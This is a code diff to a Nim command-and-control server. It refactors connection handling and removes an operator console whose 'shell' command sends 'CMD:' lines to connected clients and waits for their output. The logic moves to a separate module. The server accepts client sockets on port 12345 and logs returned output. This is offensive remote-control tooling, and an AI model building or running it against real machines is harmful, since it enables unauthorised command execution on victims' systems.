@@ -3,15 +3,12 @@ import strutils, terminal
 
 import asyncdispatch, asynchttpserver, ws, asyncfutures
 
-import types, logging
+import types, logging, cli
 
-proc newServer(): C2Server =
-  C2Server(socket: newAsyncSocket(), clients: @[])
+infoLog "initializing c2 server"
 
-var server = newServer()
-infoLog "server initialized"
-
-var clResp: Future[void]
+var server = C2Server(socket: newAsyncSocket(), clients: @[])
+var clResp = new (ref Future[void])
 
 proc processMessages(server: C2Server, client: Client) {.async.} =
   while true:
@@ -38,12 +35,8 @@ proc processMessages(server: C2Server, client: Client) {.async.} =
     if line.startsWith("OUTPUT:"):
       logClientOutput client, args[1], args[2]
       if not clResp.isNil():
-        clResp.complete()
-        clResp = nil
-
-    # for c in server.clients:
-    #   if c.id != client.id and c.connected:
-    #     await c.socket.send(line & "\c\l")
+        clResp[].complete()
+        clResp[] = nil
 
 proc acceptSocketClients(port = 12345) {.async.} =
   server.socket.bindAddr(port.Port)
@@ -69,82 +62,7 @@ proc acceptSocketClients(port = 12345) {.async.} =
     server.clients.add(client)
     asyncCheck processMessages(server, client)
 
-proc procStdin() {.async.} =
-  var handlingClient: int = -1
-
-  prompt(handlingClient, server)
-  var messageFlowVar = spawn stdin.readLine()
-  while true:
-    if messageFlowVar.isReady():
-      
-      let cmd = ^messageFlowVar
-      let args = cmd.split(" ")
-      let argsn = len(args)
-
-      if cmd == "clients":
-        for client in server.clients:
-          if client.connected:
-            stdout.styledWriteLine fgGreen, "[+] ", $client, fgWhite
-          else:
-            stdout.styledWriteLine fgRed, "[-] ", $client, fgWhite
-          infoLog $len(server.clients) & " clients currently connected"
-      if cmd.startsWith("switch"):
-        for client in server.clients:
-          if client.id == parseInt(args[1]):
-            handlingClient = parseInt(args[1])
-        if handlingClient != parseInt(args[1]):
-          infoLog "client not found"
-      if cmd.startsWith("ping"):
-        for client in server.clients:
-          if client.id == parseInt(cmd.split(" ")[1]):
-            echo "pinging " & $client
-            await client.socket.send("ping\r\n")
-      if cmd.startsWith("info"):
-        for client in server.clients:
-          if client.id == handlingClient:
-            echo @client
-      if cmd.startsWith("shell"):
-        for client in server.clients:
-          if client.id == handlingClient:
-            await client.socket.send("CMD:" & args[1..(argsn - 1)].join(" ") & "\r\n")
-            if clResp.isNil():
-              clResp = newFuture[void]()
-              await clResp
-      if cmd == "back": 
-        handlingClient = -1
-
-      prompt(handlingClient, server)
-      messageFlowVar = spawn stdin.readLine()
-      
-    await asyncdispatch.sleepAsync(100)
-
-# var connections = newSeq[WebSocket]()
-
-# proc cb(req: Request) {.async, gcsafe.} =
-#   if req.url.path == "/ws":
-#     try:
-#       var ws = await newWebSocket(req)
-#       connections.add ws
-#       await ws.send("Welcome to simple chat server")
-#       while ws.readyState == Open:
-#         let packet = await ws.receiveStrPacket()
-#         echo "Received packet: " & packet
-#         for other in connections:
-#           if other.readyState == Open:
-#             asyncCheck other.send(packet)
-#     except WebSocketClosedError:
-#       echo "Socket closed. "
-#     except WebSocketProtocolMismatchError:
-#       echo "Socket tried to use an unknown protocol: ", getCurrentExceptionMsg()
-#     except WebSocketError:
-#       echo "Unexpected socket error: ", getCurrentExceptionMsg()
-#   await req.respond(Http200, "Hello World")
-
-# var httpServer = newAsyncHttpServer()
-
-
-asyncCheck procStdin()
+asyncCheck procStdin(server, clResp)
 asyncCheck acceptSocketClients()
-# asyncCheck httpServer.serve(Port(9001), cb)
 
 runForever()
